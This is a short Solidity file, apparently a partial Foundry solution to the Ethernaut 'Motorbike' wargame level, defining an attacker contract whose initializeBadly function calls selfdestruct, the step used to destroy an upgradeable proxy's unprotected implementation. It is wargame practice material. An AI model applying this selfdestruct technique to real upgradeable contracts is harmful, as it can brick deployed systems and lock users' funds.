// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Motorbike, Engine} from "../../src/ethernaut/25_Motorbike/Motorbike.sol";

contract Motorbike_Attacker is Engine {
	address player;
	Motorbike coreInst;
	
	constructor(Motorbike coreInst_) payable {
		player = msg.sender;
		coreInst = coreInst_;
	}
	
	function initializeBadly() external {
		selfdestruct(payable(msg.sender));
	}
	
	function doStomething() public {
		uint i = 0;
		i++;
	}
}
